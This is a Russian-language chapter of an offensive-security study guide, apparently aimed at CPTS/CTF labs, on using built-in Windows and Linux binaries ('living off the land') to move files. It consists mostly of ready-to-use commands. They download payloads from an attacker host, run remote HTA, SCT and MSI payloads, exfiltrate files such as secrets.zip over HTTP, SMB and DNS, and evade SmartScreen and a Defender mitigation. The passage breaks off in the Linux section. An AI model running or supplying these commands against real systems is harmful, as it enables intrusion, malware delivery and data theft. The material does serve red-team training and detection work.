# 09 - LOLBins (Living off the Land)

> [← README](../../README_RU.md) · [Следующий раздел →](10-encoding.md)

Передача файлов штатными системными бинарями - когда `wget`/`curl`/`powershell` отсутствуют или недоступны в конкретной среде. «Живём с земли»: используем то, что уже установлено в ОС по умолчанию.

> **Назначение материала.** Учебный справочник для CPTS/CTF и лабораторных работ. Все техники каталогизированы в публичных базах (LOLBAS/GTFOBins) и промапплены на MITRE ATT&CK (T1105 Ingress Tool Transfer). Red team применяет их в рамках авторизованного скоупа, blue team - для детект-правил и понимания телеметрии.

> **Полные каталоги техник (постоянно обновляются):**
> - **LOLBAS** (Windows) - https://lolbas-project.github.io/ (фильтры `/functions/download`, `/functions/upload`)
> - **GTFOBins** (Unix/Linux) - https://gtfobins.github.io/ (фильтры `#file-download`, `#file-upload`)
> - **LOLDrivers** (уязвимые драйверы) - https://www.loldrivers.io/
> - **Filesec / LOLBins lists** - https://filesec.io/

> **Вынесено в другие файлы:** `certutil`/`bitsadmin`/`curl` - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md), FTP - [05-ftp.md](05-ftp.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), Netcat - [07-netcat.md](07-netcat.md), DNS/ICMP - [12-dns-icmp.md](12-dns-icmp.md).

> **Важно:** часть методов зависит от версии Windows/Office/Visual Studio и может быть пропатчена или заблокирована политиками. Проверяйте в своей лаборатории и сверяйтесь с LOLBAS; пути к бинарям тоже могут отличаться.

> **SSH-учётки:** в примерах с OpenSSL/SSH используются `LHOST_user` / `RHOST_user` — логины для SSH на LHOST/RHOST. Задайте их заранее: `export LHOST_user=user RHOST_user=user` (см. [переменные в README](../../README_RU.md#обозначения-и-переменные)).

---

## Навигация

|  |  |
|---|---|
| [Быстрый выбор](#быстрый-выбор) | [Быстрый указатель: бинарь → путь](#быстрый-указатель-бинарь--путь) |
| [1.🪟Windows - download по URL (HTTP/HTTPS)](#1windows---download-по-url-httphttps) | [2.🪟Windows - копирование с UNC-шары (SMB/WebDAV)](#2windows---копирование-с-unc-шары-smbwebdav) |
| [3.🪟Windows - upload / эксфил](#3windows---upload--эксфил) | [4.🪟Windows - экзотика](#4windows---экзотика) |
| [5.🐧Linux / Unix - альтернативы](#5linux--unix---альтернативы) | [6. openssl s_server / s_client (передача по TLS)](#6-openssl-s_server--s_client-передача-по-tls) |
| [7. Заметки](#7-заметки) |  |

---

## Быстрый выбор

| Что нужно | Чем |
|---|---|
| URL → файл на диск | `certutil`, `MpCmdRun`, `bitsadmin`, `certoc`, `msedge_proxy`, `curl.exe` |
| URL → кэш/INetCache | `InstallUtil`, `Ngen`, `Presentationhost`, `Xwizard`, `msoxmled`, `Scrobj.dll`, `PhotoViewer.dll` |
| UNC/SMB → локально | `esentutl`, `extrac32`, `expand`, `replace`, `makecab`, `diantz` |
| Локально → удалённо | `ConfigSecurityPolicy`, `CertReq -Post`, `DataSvcUtil`, `type > \\host\share` |
| Скачать и выполнить | `mshta`, `regsvr32`, `msiexec`, `rundll32 url.dll`, `HH.exe`, `ieexec`, `Update.exe` |
| Эксфил по DNS | `TestWindowRemoteAgent`, `nslookup` |
| Linux без wget/curl | `busybox wget`, `lynx`, `GET`, `socat`, `tftp`, `whois`, `ssh` |

> `INetCache` — часто `%LOCALAPPDATA%\Microsoft\Windows\INetCache\`; если «скачал, но файла нет», ищите там.

---

## Быстрый указатель: бинарь → путь

| Бинарь | Где лежит (типовой путь) |
|--------|--------------------------|
| `bitsadmin` | `C:\Windows\System32\bitsadmin.exe` |
| `certutil` | `C:\Windows\System32\certutil.exe` |
| `certoc` | `C:\Windows\System32\certoc.exe` |
| `mshta` | `C:\Windows\System32\mshta.exe` |
| `msiexec` | `C:\Windows\System32\msiexec.exe` |
| `regsvr32` | `C:\Windows\System32\regsvr32.exe` |
| `rundll32` | `C:\Windows\System32\rundll32.exe` |
| `url.dll` | `C:\Windows\System32\url.dll` |
| `MpCmdRun` | `C:\ProgramData\Microsoft\Windows Defender\Platform\<версия>\MpCmdRun.exe` |
| `ieexec` | `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe` |
| `InstallUtil` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe` |
| `ngen` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe` |
| `Presentationhost` | `C:\Windows\System32\Presentationhost.exe` |
| `xwizard` | `C:\Windows\System32\xwizard.exe` |
| `msedge` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe` |
| `msedge_proxy` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe` |
| `VSLaunchBrowser` | `C:\Program Files\Microsoft Visual Studio\<версия>\...\VSLaunchBrowser.exe` |
| `hh` | `C:\Windows\hh.exe` |
| `msoxmled` | `C:\Program Files\Microsoft Office\root\vfs\...\msoxmled.exe` |
| `ProtocolHandler` | `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe` |
| `scrobj.dll` | `C:\Windows\System32\scrobj.dll` |
| `PhotoViewer.dll` | `C:\Program Files\Windows Photo Viewer\PhotoViewer.dll` |
| `shimgvw.dll` | `C:\Windows\System32\shimgvw.dll` |
| `Update.exe` / `Squirrel.exe` | `%LOCALAPPDATA%\<app>\Update.exe` (напр. `...\Microsoft\Teams\update.exe`) |
| Офис (`Excel`/`winword`/…) | `C:\Program Files\Microsoft Office\Office16\` |
| `xsd` | `C:\Program Files (x86)\Microsoft SDKs\Windows\<версия>\bin\...\xsd.exe` |
| `cmd` | `C:\Windows\System32\cmd.exe` |
| `esentutl` | `C:\Windows\System32\esentutl.exe` |
| `expand` | `C:\Windows\System32\Expand.exe` |
| `extrac32` | `C:\Windows\System32\extrac32.exe` |
| `findstr` | `C:\Windows\System32\findstr.exe` |
| `makecab` | `C:\Windows\System32\makecab.exe` |
| `diantz` | `C:\Windows\System32\diantz.exe` |
| `replace` | `C:\Windows\System32\replace.exe` |
| `print` | `C:\Windows\System32\print.exe` |
| `PrintBrm` | `C:\Windows\System32\spool\tools\PrintBrm.exe` |
| `ldifde` | `C:\Windows\System32\ldifde.exe` |
| `ConfigSecurityPolicy` | `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe` |
| `certreq` | `C:\Windows\System32\certreq.exe` |
| `DataSvcUtil` | `C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe` |
| `TestWindowRemoteAgent` | `...\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe` |
| `wsl` | `C:\Windows\System32\wsl.exe` |
| `winget` | `%LOCALAPPDATA%\Microsoft\WindowsApps\winget.exe` |
| `devtunnel` | `%LOCALAPPDATA%\Temp\DevTunnels\devtunnel.exe` |
| `finger` | `C:\Windows\System32\finger.exe` |
| `nslookup` | `C:\Windows\System32\nslookup.exe` |
| `IMEWDBLD` | `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe` |
| `AppInstaller` | `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_<версия>_...\AppInstaller.exe` |
| `desktopimgdownldr` | `C:\Windows\System32\desktopimgdownldr.exe` |
| `OneDriveStandaloneUpdater` | `C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe` |
| `bcp` | `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\<версия>\Tools\Binn\bcp.exe` |

> **Найти путь на самой цели:**
> ```cmd
> where certutil
> ```
> ```powershell
> Get-Command certutil | Select-Object -ExpandProperty Source
> ```
>
> **32/64-битность:** 64-битные бинари - в `C:\Windows\System32`, 32-битные - в `C:\Windows\SysWOW64` (да, наоборот - это WOW64-редирект). Если `System32`-варианта нет, пробуем `SysWOW64`.

---

## 1.🪟Windows - download по URL (HTTP/HTTPS)

> Готовый тестер: [`scripts/Windows-download-test.ps1`](../../scripts/Windows-download-test.ps1) - `-LOLBINS -All` прогоняет безопасную матрицу LOLBins. `-Danger` запускает **только** danger-методы (desktopimgdownldr, certutil `-URL`, CertOC, ConfigSecurityPolicy, xsd, IMEWDBLD) - только лаборатория; `-Danger -LOLBINS` включает оба набора. `-UNCPath '\\host\share\file'` включает UNC-секцию.

### Bitsadmin / BITS

> **Путь:** `C:\Windows\System32\bitsadmin.exe`

**BITS** (Background Intelligent Transfer Service) — служба Windows для фоновых загрузок. `bitsadmin.exe` только создаёт задание; саму передачу делает служба `BITS`, поэтому сетевые соединения идут не от `bitsadmin.exe`, а от `svchost.exe`.

**Проверить службу:**
```cmd
sc query bits
:: если STOPPED:
net start bits
```

```powershell
Get-Service BITS
```

**Простая загрузка (ждёт завершения и показывает прогресс):**
```cmd
bitsadmin /transfer myjob /download /priority normal http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

> **`0x80200013` / `BG_E_INSUFFICIENT_RANGE_SUPPORT`** означает, что сервер проигнорировал Range-запрос и вернул весь файл (`200`). `python3 -m http.server` и `php -S` делают именно так. `Accept-Ranges` - только подсказка: `updog`/Werkzeug может отдать `206` без него. Проверьте Range-запросом, добавьте `/dynamic` (`bitsadmin`) или `-Dynamic` (`Start-BitsTransfer`), либо используйте `busybox`/`ruby`/`nginx`/`updog`.

- `/priority`: `foreground`, `high`, `normal`, `low`.
- `foreground` — самый высокий приоритет, полезно, когда «зависло в очереди».
- Если файл уже существует, BITS может вернуть ошибку — удалите его заранее.
- Папка назначения должна существовать; пути с пробелами берите в кавычки.
- Если сервер не поддерживает range/докачку (например, `python3 -m http.server`), добавьте `/dynamic`:
```cmd
bitsadmin /transfer myjob /download /priority normal /dynamic http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Ручное управление заданием (когда `/transfer` непонятно где висит):**
```cmd
bitsadmin /create myjob
bitsadmin /addfile myjob http://%LHOST%/payload.exe C:\Users\Public\payload.exe
bitsadmin /setpriority myjob high
bitsadmin /resume myjob
```

**Смотреть состояние:**
```cmd
bitsadmin /list
bitsadmin /list /allusers        # нужен админ
bitsadmin /info myjob /verbose
bitsadmin /getstate myjob
bitsadmin /monitor
```

**Завершить/удалить:**
```cmd
bitsadmin /complete myjob
bitsadmin /cancel myjob
bitsadmin /reset
```

> `/complete` нужен для ручного задания: после `TRANSFERRED` файл может быть ещё не «зафиксирован». `/reset` отменяет **все** задания текущего пользователя; `/reset /allusers` — все задания, нужен админ. `Ctrl+C` в `bitsadmin /transfer` останавливает только вывод прогресса — задание может остаться в очереди, проверяйте `/list`.

**Состояния задания:**

| Состояние | Что значит |
|---|---|
| `CONNECTING` | идёт подключение |
| `TRANSFERRING` | качает |
| `TRANSFERRED` | скачано; для ручного задания нужен `/complete` |
| `SUSPENDED` | приостановлено |
| `TRANSIENT_ERROR` | временная ошибка, BITS повторяет |
| `ERROR` | фатальная ошибка |
| `CANCELLED` | отменено |

**Direct upload через BITS — важный нюанс:**
```cmd
bitsadmin /transfer uploadjob /upload /priority normal http://%LHOST%/upload C:\Users\Public\secrets.zip
```

Это **не** обычный HTTP POST. Для `/upload` нужен BITS-совместимый сервер (IIS BITS Upload, BITSServer и т.п.). Против `python -m http.server`, `uploadserver`, `serv.py` или nginx PUT BITS-upload обычно не работает — он ожидает свой протокол. Для эксфила на свой приёмник берите `certreq`, `curl`, `ConfigSecurityPolicy` или `type > \\host\share`.

**PowerShell-вариант:**
```powershell
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -Priority Normal

# через системный прокси
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -ProxyUsage SystemDefault

# асинхронно
$job = Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -Asynchronous
Get-BitsTransfer -JobId $job.JobId
Complete-BitsTransfer -BitsJob $job
```

**Upload через PowerShell** (тоже нужен BITS-сервер):
```powershell
Start-BitsTransfer -TransferType Upload -Source "C:\Users\Public\secrets.zip" -Destination "http://${LHOST}/upload"
```

**Типовые ошибки:**

| Код/симптом | Причина | Решение |
|---|---|---|
| `0x80070422` | служба BITS отключена | `net start bits`, проверить политику |
| `0x80072EE7` | не резолвится имя/прокси | проверить DNS, `nslookup`, прокси |
| `0x80072EFD` | не подключается | firewall/порт/URL |
| `0x80190194` | HTTP 404 | проверить путь на сервере |
| `0x80070005` | access denied | права на папку назначения |
| `0x80070050` | файл уже существует | удалить файл или взять другое имя |
| `0x80072F8F` | TLS/сертификат | HTTP или доверенный серт; self-signed BITS часто не любит |
| `TRANSFERRED`, но файла нет | ручное задание не завершено | `bitsadmin /complete myjob` |
| задание висит в `TRANSFERRING` | прокси/авторизация/сервер | `bitsadmin /info myjob /verbose`, затем `/cancel`, `/reset` |

> BITS-задания живут в очереди пользователя и могут переживать перезапуск. После работы чистите: `bitsadmin /reset` или `Get-BitsTransfer | Remove-BitsTransfer`.

> Для защитника: BITS виден в логах службы, а сетевой трафик идёт от `svchost.exe`, а не от `bitsadmin.exe`. Поэтому одного мониторинга процесса `bitsadmin.exe` мало.

### Certutil (3 варианта)

> **Путь:** `C:\Windows\System32\certutil.exe`

**Классика - в `C:\Users\Public`:**
```cmd
certutil.exe -urlcache -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Крупный файл / нестабильный канал:**
```cmd
certutil.exe -urlcache -split -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**`-verifyctl` - в `C:\Users\Public` (или в CryptnetUrlCache, если путь не задан):**
```cmd
certutil.exe -verifyctl -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

> `-verifyctl` ориентирован на CTL. На некоторых сборках Windows Server он скачивает файл, но затем падает с `DecodeFile ... file not found` на произвольных бинарниках. В этом случае используйте `-urlcache`.

**`-URL` - кладёт в `%LOCALAPPDATA%\Microsoft\CryptnetUrlCache\Content\<hash>`:**
```cmd
certutil.exe -URL http://%LHOST%/payload.exe
```

### MpCmdRun (Defender)

> **Путь:** `C:\ProgramData\Microsoft\Windows Defender\Platform\<версия>\MpCmdRun.exe` (или `C:\Program Files\Windows Defender\MpCmdRun.exe`)

**Прямой download:**
```cmd
MpCmdRun.exe -DownloadFile -url http://%LHOST%/payload.exe -path C:\Users\Public\payload.exe
```

> `-DownloadFile` требует версию Defender platform, где он поддерживается. На старых версиях Defender platform этого флага нет (встречается на Server 2019/2022 со старой платформой); тестер показывает `mpcmdrun` как SKIP.

**Копируем бинарь из папки платформы и запускаем (обход митигации Win10):**
```cmd
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\MP.exe
chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"
C:\Users\Public\MP.exe -DownloadFile -url http://%LHOST%/payload.exe -path C:\Users\Public\payload.exe
```

### CertOC

> **Путь:** `C:\Windows\System32\certoc.exe`

**Скачивает текстовые файлы (скрипты, веб-шеллы):**
```cmd
certoc.exe -GetCACAPS http://%LHOST%/file.ps1
```

### Ieexec

> **Путь:** `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`

**Скачивает и запускает .NET-исполняемый файл:**
```cmd
ieexec.exe http://%LHOST%/payload.exe
```

### Installutil

> **Путь:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

**Кладёт payload в INetCache:**
```cmd
InstallUtil.exe http://%LHOST%/payload.exe
```

### Ngen

> **Путь:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe`

**Кладёт payload в INetCache:**
```cmd
ngen.exe http://%LHOST%/payload.exe
```

### Presentationhost

> **Путь:** `C:\Windows\System32\Presentationhost.exe`

**Кладёт payload в INetCache:**
```cmd
Presentationhost.exe http://%LHOST%/payload.exe
```

### Xwizard

> **Путь:** `C:\Windows\System32\xwizard.exe`

**Через мастер RemoteApp скачивает файл в INetCache:**
```cmd
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttp://%LHOST%/payload.exe
```

### msedge

> **Путь:** `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`

**Открывает URL и скачивает файл (добавляем безобидное расширение, чтобы обойти SmartScreen):**
```cmd
msedge.exe http://%LHOST%/payload.exe.txt
```

**Headless - тихо выгружает содержимое в файл (данные лучше в base64):**
```cmd
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "http://%LHOST%/file.b64.html" > file.b64
```

### msedge_proxy

> **Путь:** `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe`

**Скачивает файл:**
```cmd
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe" http://%LHOST%/file.zip
```

### VSLaunchBrowser

> **Путь:** `C:\Program Files\Microsoft Visual Studio\<версия>\Community\Common7\IDE\VSLaunchBrowser.exe`

**Скачивает в INetCache и открывает ассоциированным приложением:**
```cmd
VSLaunchBrowser.exe .exe http://%LHOST%/payload.exe
```

### Hh (HTML Help)

> **Путь:** `C:\Windows\hh.exe`

**Открывает удалённый файл через HTML Help:**
```cmd
HH.exe http://%LHOST%/file.bat
```

### msoxmled

> **Путь:** `C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\msoxmled.exe`

**Microsoft Office XML Editor - тянет файл в INetCache:**
```cmd
msoxmled.exe /verb open http://%LHOST%/payload.exe
```

### ProtocolHandler

> **Путь:** `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe`

**Открывает URL в браузере по умолчанию (файл часто падает в Downloads):**
```cmd
ProtocolHandler.exe http://%LHOST%/payload.exe
```

### Rundll32 + url.dll

> **Путь:** `C:\Windows\System32\rundll32.exe`, `C:\Windows\System32\url.dll`

**Открывает URL через обработчик протокола; файл обычно падает в Downloads/INetCache:**
```cmd
rundll32.exe url.dll,FileProtocolHandler http://%LHOST%/payload.exe
```

### Scrobj.dll через rundll32

> **Путь:** `C:\Windows\System32\scrobj.dll`

**Скачивает файл в INetCache:**
```cmd
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://%LHOST%/payload.exe
```

### PhotoViewer.dll через rundll32

> **Путь:** `C:\Program Files\Windows Photo Viewer\PhotoViewer.dll`

**Скачивает файл в INetCache:**
```cmd
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen http://%LHOST%/payload.exe
```

### Shimgvw.dll через rundll32

> **Путь:** `C:\Windows\System32\shimgvw.dll`

**Скачивает файл в INetCache:**
```cmd
rundll32.exe C:\Windows\System32\shimgvw.dll,ImageView_Fullscreen http://%LHOST%/payload.exe
```

### Update.exe / Squirrel.exe

> **Путь:** `%LOCALAPPDATA%\Microsoft\Teams\update.exe` / `%LOCALAPPDATA%\Discord\Update.exe` (у каждого Electron-приложения свой)

**Апдейтер Electron-приложений (Teams, Discord, Slack, GitHub Desktop…) тянет пакет с URL:**
```cmd
%LOCALAPPDATA%\Discord\Update.exe --download http://%LHOST%/
```

```cmd
squirrel.exe --download http://%LHOST%/
```

### Офисные приложения

> **Путь:** `C:\Program Files\Microsoft Office\Office16\` (Excel.exe, winword.exe, Powerpnt.exe, Outlook.exe, MSAccess.exe, Mspub.exe, MSOHTMED.exe)

**Excel:**
```cmd
Excel.exe http://%LHOST%/payload.exe
```

**Word:**
```cmd
winword.exe http://%LHOST%/payload.exe
```

**PowerPoint:**
```cmd
Powerpnt.exe http://%LHOST%/payload.exe
```

**Outlook:**
```cmd
Outlook.exe http://%LHOST%/payload.exe
```

### xsd

> **Путь:** `C:\Program Files (x86)\Microsoft SDKs\Windows\<версия>\bin\NETFX <версия> Tools\xsd.exe`

**Кладёт payload в INetCache:**
```cmd
xsd.exe http://%LHOST%/payload.exe
```

---

## 2.🪟Windows - копирование с UNC-шары (SMB/WebDAV)

> Нужна шара оператора: SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md). Путь вида `\\LHOST\share\file`.
>
> **Аутентифицируйтесь до UNC-тестов.** Для шары с паролем выполните `net use \\LHOST\share /user:test test`; без этого методы копирования падают с `Path not found` / `Cannot open file`.
>
> `-UNCPath '\\LHOST\share\payload.exe'` в тестере ожидает эту шару. Пример на LHOST: `sudo impacket-smbserver share /tmp/share -smb2support -username test -password test`.
>
> `esentutl` может падать с `JET_errDiskIO` на некоторых SMB-шарах/сборках Server даже после `net use`; надёжнее `extrac32` и `replace`.

### Cmd (`type` + редирект)

> **Путь:** `C:\Windows\System32\cmd.exe`

**Download с шары в локальный файл:**
```cmd
type \\%LHOST%\share\payload.exe > C:\Users\Public\payload.exe
```

**Upload локального файла на шару:**
```cmd
type C:\Users\Public\payload.exe > \\%LHOST%\share\payload.exe
```

### Esentutl

> **Путь:** `C:\Windows\System32\esentutl.exe`

**Копирует файл с UNC-пути на локальный:**
```cmd
esentutl.exe /y \\%LHOST%\share\payload.exe /d C:\Users\Public\payload.exe /o
```

> Для шары с аутентификацией нужен `net use`. Даже с ним `esentutl` может падать с `JET_errDiskIO` на некоторых SMB-шарах/сборках Server; надёжнее `extrac32` и `replace`.

### Expand

> **Путь:** `C:\Windows\System32\Expand.exe`

**Копирует файл (обычно .cab) с шары:**
```cmd
expand \\%LHOST%\share\file.cab C:\Users\Public\payload.exe
```

### Extrac32

> **Путь:** `C:\Windows\System32\extrac32.exe`

**Копирует файл с шары:**
```cmd
extrac32 /Y /C \\%LHOST%\share\payload.exe C:\Users\Public\payload.exe
```

**В альтернативный поток данных (ADS) - демонстрация T1564.004:**
```cmd
extrac32 /Y /C \\%LHOST%\share\payload.exe "C:\Users\Public\host.txt:payload.exe"
```

### Findstr

> **Путь:** `C:\Windows\System32\findstr.exe`

**`/V /L` с заведомо отсутствующей строкой выводит файл целиком (текст!):**
```cmd
findstr /V /L W3AllLov3LolBas \\%LHOST%\share\file.txt > C:\Users\Public\file.txt
```

> Для бинарей не годится - `findstr` работает построчно и может испортить данные.

### Makecab

> **Путь:** `C:\Windows\System32\makecab.exe`

**Тянет файл с шары и сразу пакует в .cab:**
```cmd
makecab \\%LHOST%\share\payload.exe C:\Users\Public\file.cab
```

### Diantz

> **Путь:** `C:\Windows\System32\diantz.exe`

**То же самое через `diantz` (потом `expand`):**
```cmd
diantz.exe \\%LHOST%\share\payload.exe C:\Users\Public\file.cab
```

```cmd
expand C:\Users\Public\file.cab -F:* C:\Users\Public\
```

### Replace

> **Путь:** `C:\Windows\System32\replace.exe`

**Штатная «замена файлов» копирует с шары:**
```cmd
replace.exe \\%LHOST%\share\payload.exe C:\Temp /A
```

### Print

> **Путь:** `C:\Windows\System32\print.exe`

**Копирует файл с шары на диск (через print spooler; проверяйте бинарники):**
```cmd
print /D:C:\Users\Public\file.txt \\%LHOST%\share\file.txt
```

### PrintBrm

> **Путь:** `C:\Windows\System32\spool\tools\PrintBrm.exe`

**Забирает содержимое удалённой папки в zip:**
```cmd
PrintBrm -b -d \\%LHOST%\share\loot -f C:\Users\Public\secrets.zip
```

### Ldifde

> **Путь:** `C:\Windows\System32\ldifde.exe`

**Импорт .ldf; если внутри `http://`-ссылка на атрибут - файл скачается в IE temp:**
```cmd
Ldifde -i -f C:\Users\Public\file.ldf
```

---

## 3.🪟Windows - upload / эксфил

### ConfigSecurityPolicy (Defender)

> **Путь:** `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe` (или `C:\ProgramData\Microsoft\Windows Defender\Platform\<версия>\ConfigSecurityPolicy.exe`)

**Upload: сначала локальный файл, потом URL (порядок важен!):**
```cmd
ConfigSecurityPolicy.exe C:\Users\Public\sample.txt http://%LHOST%/
```

**Download-вариант (URL без файла) кладёт ответ в INetCache:**
```cmd
ConfigSecurityPolicy.exe http://%LHOST%/payload.exe
```

### CertReq

> **Путь:** `C:\Windows\System32\certreq.exe`

**Upload - шлём файл POST-ом на приёмник оператора:**
```cmd
certreq.exe -Post -config http://%LHOST%/ C:\Users\Public\sample.txt
```

**Download - ответ сервера сохраняем в файл:**
```cmd
certreq.exe -Post -config http://%LHOST%/ C:\Users\Public\sample.txt C:\Users\Public\resp.txt
```

### DataSvcUtil

> **Путь:** `C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe`

**Upload/эксфил: локальный файл указывается в `/out:`, URL приёмника — в `/uri:`**
```cmd
DataSvcUtil /out:C:\Users\Public\sample.txt /uri:http://%LHOST%/
```

### TestWindowRemoteAgent

> **Путь:** `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe`

**Эксфил через DNS: данные (hex/base32) уезжают в поддомене вашего домена:**
```cmd
set DATA=48656c6c6f
TestWindowRemoteAgent.exe start -h %DATA%.%DOMAIN% -p 8000
```

### Cmd (`type` + редирект)

> **Путь:** `C:\Windows\System32\cmd.exe`

**Upload на WebDAV-шару:**
```cmd
type C:\Users\Public\secrets.zip > \\%LHOST%\share\secrets.zip
```

---

## 4.🪟Windows - экзотика

### Mshta

> **Путь:** `C:\Windows\System32\mshta.exe`

**Скачивает и выполняет удалённый HTA:**
```cmd
mshta.exe http://%LHOST%/payload.hta
```

### Regsvr32 (remote SCT)

> **Путь:** `C:\Windows\System32\regsvr32.exe`

**Скачивает и выполняет scriptlet через `scrobj.dll`:**
```cmd
regsvr32.exe /s /n /u /i:http://%LHOST%/payload.sct scrobj.dll
```

### Msiexec

> **Путь:** `C:\Windows\System32\msiexec.exe`

**Скачивает и устанавливает MSI:**
```cmd
msiexec.exe /q /i http://%LHOST%/payload.msi
```

### Wsl

> **Путь:** `C:\Windows\System32\wsl.exe`

**WSL как загрузчик — bash внутри WSL качает по `/dev/tcp` (сырой TCP, не HTTP):**
```cmd
:: LHOST: nc -lvnp 9000 < payload.exe
wsl.exe --exec bash -c "cat < /dev/tcp/%LHOST%/9000 > /tmp/binary"
```

### winget

> **Путь:** `%LOCALAPPDATA%\Microsoft\WindowsApps\winget.exe`

**Ставит софт из Microsoft Store даже при заблокированном Store (напр. Sysinternals Suite):**
```cmd
winget.exe install --accept-package-agreements -s msstore "Sysinternals Suite"
```

### devtunnel

> **Путь:** `%LOCALAPPDATA%\Temp\DevTunnels\devtunnel.exe`

**Выставляет локальный сервис цели наружу (expose порта):**
```cmd
devtunnel.exe host -p 8080
```

### Finger

> **Путь:** `C:\Windows\System32\finger.exe`

**Передача по протоколу finger (порт 79, только текст/небольшие строки). Нужен finger-сервер на LHOST:**
```cmd
finger user@%LHOST% | more +2 > file.txt
```

### Nslookup

> **Путь:** `C:\Windows\System32\nslookup.exe`

**Когда наружу только DNS (порт 53) — данные в имени запроса, ответ можно использовать для подтверждения:**
```cmd
set CHUNK=TVqQAAMAAAAEAAAA
nslookup %CHUNK%.transfer.%DOMAIN% %LHOST%
```

> Для exfil данные кодируют в поддомен (base32/hex), а на LHOST собирают запросы из DNS-лога. TXT-ответ — отдельный канал вниз, не замена этому.

### Imewdbld

> **Путь:** `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`

**HTTP-загрузчик словарей IME - качает в `%TEMP%` (случайное имя):**
```cmd
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe http://%LHOST%/payload.exe
```

### AppInstaller (ms-appinstaller)

> **Путь:** `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_<версия>_x64__8wekyb3d8bbwe\AppInstaller.exe`

**Загрузка по URI-схеме в INetCache приложения App Installer:**
```cmd
start ms-appinstaller://?source=http://%LHOST%/file.txt
```

Приземляется в: `%LOCALAPPDATA%\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\`

### Desktopimgdownldr

> **Путь:** `C:\Windows\System32\desktopimgdownldr.exe`

**Загрузчик обоев экрана блокировки (со сменой `SYSTEMROOT` меняется каталог):**
```cmd
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://%LHOST%/payload.exe /eventName:foo
```

> **Не разрушает данные, но меняет состояние.** Он пишет `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP` (`LockScreenImageUrl`, `LockScreenImagePath`, `LockScreenImageStatus`) и ставит скачанный файл на lockscreen. Верните прежний lockscreen или удалите эти значения после теста. Тестер запускает его с временным `SYSTEMROOT` и переносит файл, но запись в реестре остаётся - только с `-Danger`, исключён из `-All`.

### OneDriveStandaloneUpdater

> **Путь:** `C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe`

**Качает файл по URL из реестра `HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC`:**
```cmd
OneDriveStandaloneUpdater
```

> Нюанс: `ODSUUpdateXMLUrlFromOC` и `UpdateXMLUrlFromOC` должны быть непустыми, а `UpdateOfficeConfigTimestamp` - большим QWORD (напр. `99999999999`). Файл падает в `%LOCALAPPDATA%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json`.

### Bcp

> **Путь:** `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\<версия>\Tools\Binn\bcp.exe`

**Выгрузка из БД в файл (когда есть SQL-доступ):**
```cmd
bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
```

---

## 5.🐧Linux / Unix - альтернативы

> Путь на Linux ищи через `command -v <бинарь>` (обычно `/usr/bin/<бинарь>`).

### Busybox wget

> **Путь:** `/usr/bin/busybox` (или `/bin/busybox`)

**Урезанный wget - часто единственная качалка на embedded/контейнерах:**
```bash
busybox wget http://$LHOST/payload.sh -O /tmp/payload.sh
```

### Lynx

> **Путь:** `/usr/bin/lynx`

**Текстовый браузер: `-source` выводит тело страницы в stdout (для текстовых файлов/скриптов):**
```bash
